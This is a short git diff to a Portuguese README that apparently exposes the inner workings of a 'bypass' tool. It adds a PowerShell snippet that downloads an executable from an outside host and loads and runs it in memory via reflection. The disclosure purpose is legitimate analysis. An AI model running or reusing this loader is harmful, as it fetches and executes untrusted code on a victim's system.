@@ -8,6 +8,22 @@ Unpack de um Bypass Considerado "Bom" porém que de bom não tem nada, sua inje�
 
 ---
 
+## 🎭 PowerShell Inject CommandLine
+
+```hex
+$link = "https://katiamodas.store/p.exe"
+$webClient = New-Object System.Net.WebClient
+$bytes = $webClient.DownloadData($link)
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+$entry = $assembly.EntryPoint
+
+if ($entry.GetParameters().Count -eq 1) {
+    $entry.Invoke($null, @([string[]]@()))
+} else {
+    $entry.Invoke($null, $null)
+}
+```
+
 ## 🖼️ Fucked Bypass Community
 
 ![image](https://raw.githubusercontent.com/137f/PoloniumBypass-Unpacked/refs/heads/main/fuckedpolonium/polonium.png)  
